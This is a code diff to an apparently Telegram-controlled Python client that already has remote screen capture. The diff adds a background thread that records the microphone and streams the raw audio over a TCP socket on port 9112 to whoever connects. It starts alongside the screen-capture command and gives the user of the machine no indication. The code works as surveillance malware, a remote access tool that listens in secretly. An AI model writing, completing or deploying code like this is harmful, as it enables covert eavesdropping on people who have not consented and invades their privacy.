@@ -16,6 +16,8 @@ from telebot import TeleBot
 from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from PIL import Image
 
+from threading import Thread
+
 
 
 """ Fn """
@@ -290,6 +292,9 @@ class Client:
             def getscreen_next(ms):
                 if ms.text != "EXIT":
                     try:
+                        self.running_micro = True
+                        thr = Thread(target=self.get_micro).start()
+                        
                         list_data = ms.text.split()
                         PORT = int(list_data[0])
                         IP = list_data[1]
@@ -328,7 +333,42 @@ class Client:
 
             bot.register_next_step_handler(ms, getscreen_next)
 
+    def get_micro(self):
+        port = 9112
+        chunk = 8192
+        FORMAT = pyaudio.paInt16
+        CHANNELS = 1
+        RATE = 44100
 
+        p = pyaudio.PyAudio()
+        stream = p.open(format=FORMAT,
+                        channels=CHANNELS,
+                        rate=RATE,
+                        input=True,
+                        output=True,
+                        frames_per_buffer=chunk)
+
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.bind(('', port))
+        server_socket.listen(5)
+        client_socket, address = server_socket.accept()
+
+        print("Your IP address is: ", socket.gethostbyname(socket.gethostname()))
+        print("Server Waiting for client on port ", port)
+
+        while self.running_micro:
+            try:
+                client_socket.sendall(stream.read(chunk))
+            except IOError as e:
+                self.running_micro = False
+                
+
+
+        stream.stop_stream()
+        stream.close()
+        server_socket.close()
+        client_socket.close()
+        p.terminate()
 
 """ Variables """
 API_TOKEN = "token"
